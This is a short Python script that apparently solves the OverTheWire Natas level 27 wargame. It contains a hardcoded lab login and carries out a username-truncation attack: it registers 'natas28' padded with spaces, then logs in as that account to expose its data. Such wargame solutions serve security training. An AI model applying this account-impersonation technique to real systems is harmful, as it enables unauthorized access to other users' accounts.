import requests
import string
from requests.auth import HTTPBasicAuth

# debug=true to get the complete query string in the result
url = 'http://natas27.natas.labs.overthewire.org/index.php'
response = ''
# base auth
auth = HTTPBasicAuth('natas27', '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ')

# setup a new session
session = requests.Session()
response = session.post(url, auth=auth)
data = { 'username' : 'natas28                                                                d',
         'password' : 'pw'}
response = session.post(url, data=data, auth=auth)
data = { 'username' : 'natas28',
         'password' : 'pw'}
response = session.post(url, data=data, auth=auth)
text = response.text
print(text)

